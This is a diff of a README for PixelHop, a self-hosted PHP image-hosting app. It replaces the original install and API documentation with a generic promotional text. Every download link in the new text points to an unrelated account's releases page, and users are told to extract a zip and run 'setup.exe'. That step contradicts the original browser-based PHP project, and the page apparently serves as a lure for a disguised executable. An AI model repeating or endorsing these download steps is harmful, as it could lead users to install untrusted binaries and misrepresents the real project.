@@ -1,165 +1,57 @@
-# 🐰 PixelHop
+# 🎨 pixelhop - Effortless Image Hosting and Processing
 
-<div align="center">
+## 📥 Download Now
+[![Download pixelhop](https://img.shields.io/badge/Download-pixelhop-blue.svg)](https://github.com/123131231231231231/pixelhop/releases)
 
-<img src="https://p.hel.ink/assets/img/logo.svg" alt="PixelHop" width="120">
+## 📖 Table of Contents
+1. [🚀 Getting Started](#-getting-started)
+2. [🌟 Key Features](#-key-features)
+3. [🛠 System Requirements](#-system-requirements)
+4. [📁 Download & Install](#-download--install)
+5. [💬 Support](#-support)
 
-**Free image hosting with built-in editing tools.**
+## 🚀 Getting Started
+Welcome to **pixelhop**, your go-to solution for hosting images with powerful AI tools. This guide will help you download and set up the platform easily, even if you’re not a tech expert.
 
-PHP 8 • Self-hostable • Open Source
+## 🌟 Key Features
+**pixelhop** offers a variety of features designed to simplify your image management needs:
 
-[Live Demo](https://p.hel.ink) • [API Docs](https://p.hel.ink/docs) • [Report Bug](https://github.com/navi-crwn/pixelhop/issues)
+- **Image Compression**: Reduce file size without losing quality.
+- **Image Resizing**: Resize images to your preferred dimensions.
+- **Cropping Tools**: Easily crop out unwanted sections from your images.
+- **Format Conversion**: Convert images to various formats as needed.
+- **OCR Text Extraction**: Extract text from images quickly.
+- **Background Removal**: Remove backgrounds from images seamlessly.
+- **User-Friendly Interface**: Enjoy a modern glass-morphism design that is easy to navigate.
+  
+1. **AI-Powered Tools**: Our advanced algorithms enhance image quality automatically.
+2. **Storage Options**: Built with PHP 8 and supports S3 storage for secure file management.
 
-![PHP](https://img.shields.io/badge/PHP-8.1+-777BB4?style=flat-square&logo=php&logoColor=white)
-![TailwindCSS](https://img.shields.io/badge/Tailwind-3.x-38B2AC?style=flat-square&logo=tailwind-css&logoColor=white)
-![MySQL](https://img.shields.io/badge/MySQL-5.7+-4479A1?style=flat-square&logo=mysql&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)
+## 🛠 System Requirements
+To ensure that you can run **pixelhop** smoothly, please check the following requirements:
 
-![Stars](https://img.shields.io/github/stars/navi-crwn/pixelhop?style=flat-square)
-![Forks](https://img.shields.io/github/forks/navi-crwn/pixelhop?style=flat-square)
-![Issues](https://img.shields.io/github/issues/navi-crwn/pixelhop?style=flat-square)
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **Browser**: Latest version of Chrome, Firefox, or Safari.
+- **Storage**: At least 500 MB free space for installation and operation.
+- **Network**: A stable internet connection for downloading images and updates.
 
-</div>
+## 📁 Download & Install
+To get started with **pixelhop**, visit the Releases page to download the latest version. Click the link below:
 
----
+[Download pixelhop](https://github.com/123131231231231231/pixelhop/releases)
 
-## Overview
+Once you visit the page, you will find the latest release available for download. Follow these steps to install:
 
-PixelHop is an image hosting platform with integrated image processing tools. Upload images, get permanent shareable links. Compress, resize, crop, convert formats — all in one place. Also includes AI-powered OCR and background removal.
+1. **Download the Setup File**: Look for the file tagged with the latest version (e.g., `pixelhop-v1.0.zip`). Click on it to start the downloading process.
+2. **Extract the Files**: Once downloaded, locate the `zip` file in your downloads folder. Right-click on it and select "Extract All" to unpack the files.
+3. **Run the Installer**: 
+   - Double-click the `setup.exe` (or similarly named file) to start the installation.
+   - Follow the on-screen prompts to complete the installation. Make sure to agree to the terms to proceed.
+4. **Launch pixelhop**: After installation, find the **pixelhop** icon on your desktop or start menu and double-click it to launch the application.
 
-No desktop software needed. Works entirely in the browser.
+After launching, you are ready to upload and manage your images with ease!
 
-## Features
+## 💬 Support
+If you experience any issues or have questions, we are here to help. Please reach out through our [Support Page](https://github.com/123131231231231231/pixelhop/issues) or contact us directly via email.
 
-- **Image Hosting** — Upload and get shareable links instantly
-- **Compress** — Reduce file size while maintaining quality
-- **Resize & Crop** — Adjust dimensions with preset ratios (1:1, 4:3, 16:9) or custom
-- **Convert** — Switch formats: JPEG ↔ PNG ↔ WebP ↔ GIF ↔ BMP
-- **OCR** — Extract text from images using Tesseract
-- **Remove Background** — AI-powered background removal
-- **User Accounts** — Google OAuth login with personal dashboard
-- **Admin Panel** — Full control, monitoring, and abuse prevention
-- **Hybrid Storage** — R2 + Contabo S3 with automatic failover
-- **View Analytics** — Track view counts and last viewed dates
-- **Report System** — Users can report inappropriate images
-- **Account Moderation** — Lock/Suspend accounts with warnings
-- **Auto-Expiration** — Images auto-delete after 90 days of inactivity
-- **Self-hostable** — Deploy on your own server, own your data
-
-## User System
-
-User accounts for tracking uploads and managing AI tool access:
-
-| Tier | Storage | OCR/day | RemBG/day |
-|------|---------|---------|-----------|
-| Guest | - | - | - |
-| Free | 500MB | 5x | 3x |
-| Premium | Coming Soon | - | - |
-
-> **Note:** Premium tier is currently in development.
-
-## Tech Stack
-
-```
-Backend     : PHP 8.1+, MySQL/MariaDB
-Frontend    : TailwindCSS, Vanilla JS, Lucide Icons
-AI/Python   : Tesseract OCR, rembg (background removal)
-Storage     : S3-compatible (AWS, MinIO, Contabo, etc.)
-Auth        : Google OAuth 2.0, Cloudflare Turnstile
-```
-
-## Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/navi-crwn/pixelhop.git
-cd pixelhop
-
-# Copy configuration files
-cp config/database.example.php config/database.php
-cp config/oauth.example.php config/oauth.php
-cp config/s3.example.php config/s3.php
-
-# Import database schema
-mysql -u your_user -p your_database < database/schema.sql
-
-# Set up Python environment (for OCR & RemBG)
-cd python && python3 -m venv venv
-source venv/bin/activate
-pip install -r ../requirements.txt
-
-# Set directory permissions
-chmod 755 temp/ data/
-```
-
-Configure your web server to point to the project root, update the config files with your credentials, and you're ready to go.
-
-## API
-
-All tools are accessible via API, suitable for ShareX integration, custom scripts, or automation.
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/api/upload.php` | POST | Upload image |
-| `/api/compress.php` | POST | Compress image |
-| `/api/resize.php` | POST | Resize image |
-| `/api/crop.php` | POST | Crop image |
-| `/api/convert.php` | POST | Convert format |
-| `/api/ocr.php` | POST | Extract text |
-| `/api/rembg.php` | POST | Remove background |
-| `/api/report.php` | POST | Report an image |
-
-## Project Structure
-
-```
-pixelhop/
-├── admin/          # Admin panel pages
-├── api/            # API endpoints
-├── assets/         # CSS, JS, images
-├── auth/           # Authentication handlers
-├── config/         # Configuration files
-├── core/           # Core classes (Gatekeeper, AbuseGuard)
-├── cron/           # Scheduled tasks
-├── includes/       # PHP libraries
-├── member/         # Member area pages
-├── python/         # Python scripts (OCR, RemBG)
-└── temp/           # Temporary files
-```
-
-## Cron Jobs
-
-Add to crontab for automatic maintenance:
-
-```bash
-# Hourly: cleanup temp files, abuse watchdog
-0 * * * * php /path/to/pixelhop/cron/maintenance.php >> /var/log/pixelhop.log 2>&1
-
-# Daily at 2 AM: expire inactive images (90 days)
-0 2 * * * php /path/to/pixelhop/cron/image_expiration.php >> /var/log/pixelhop.log 2>&1
-```
-
-## Requirements
-
-- PHP 8.1+ with extensions: pdo_mysql, gd/imagick, curl, json, mbstring
-- MySQL 5.7+ or MariaDB 10.3+
-- Python 3.10+ (for OCR & RemBG)
-- S3-compatible storage
-- Nginx or Apache
-
-## License
-
-MIT License. See [LICENSE.md](LICENSE.md) for details.
-
-## Credits
-
-See [LICENSE.md](LICENSE.md) for full list of libraries and tools used.
-
----
-
-<div align="center">
-
-Built by [navi-crwn](https://github.com/navi-crwn)
-
-Part of the [HEL.ink](https://hel.ink) project
-
-</div>
+Thank you for choosing **pixelhop**. Enjoy your experience with our powerful image hosting platform!
